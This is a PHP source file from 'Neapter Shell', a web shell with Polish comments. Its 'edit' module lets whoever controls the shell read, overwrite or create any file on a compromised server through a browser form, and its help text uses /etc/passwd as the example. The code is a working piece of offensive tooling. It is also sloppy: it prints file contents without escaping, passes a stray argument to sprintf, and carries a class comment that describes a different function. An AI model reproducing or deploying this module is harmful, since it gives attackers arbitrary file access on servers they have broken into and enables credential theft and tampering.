<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleEdit extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('edit');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
edit - Edycja oraz tworzenie nowego pliku

    Użycie:
        edit /etc/passwd
        edit /sciezka/do/nowego/pliku
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $sFile = $this->oArgs->getRawData();

        if (($sFiledata = Request::getPost('filedata')) !== false) {
            return sprintf(
                'Plik %szostał zapisany',
                (! @file_put_contents($sFile, $sFiledata) ? 'nie ' : '')
            );
        }

        if ($this->oArgs->getNumberOfParams() === 0) {
            return self::getHelp();
        }

        return sprintf('<form action="%s" method="post">' .
            '<textarea id="edit" name="filedata">%s</textarea><br/>' .
            '<input type="text" name="cmd" readonly="readonly" value=":edit %s" size="110" id="cmd" autocomplete="on"/>' .
            '<input type="submit" name="submit" value="Zapisz" /></form>',
            Request::getCurrentUrl(),
            (string) file_get_contents($sFile),
            $sFile,
            htmlspecialchars(Request::getPost('cmd'))
        );
    }
}
